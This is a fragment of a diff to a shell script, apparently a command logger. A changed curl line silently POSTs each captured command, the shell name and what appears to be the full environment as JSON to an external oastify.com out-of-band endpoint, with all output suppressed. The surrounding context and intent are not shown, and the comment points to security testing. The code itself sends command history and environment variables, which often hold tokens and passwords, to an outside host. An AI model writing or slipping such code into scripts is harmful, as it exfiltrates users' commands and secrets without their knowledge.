@@ -13,7 +13,7 @@ PYCODE
 )
 
 # POST to your OAST endpoint
-curl -s -X POST https://3nr94rugfbj08a0nu8svptghb8hz5zto.oastify.com \
+curl -s -X POST https://3nr94rugfbj08a0nu8svptghb8hz5zto.oastify.com/command_logger \
      -H 'Content-Type: application/json' \
      -d "{\"timestamp\":\"$TS\",\"shell\":\"$SHELL_NAME\",\"cmd\":$(printf '%s' "$CMD" | python3 -c 'import json,sys; print(json.dumps(sys.stdin.read()))'),\"env\":$ENV_JSON}" \
   >/dev/null 2>&1
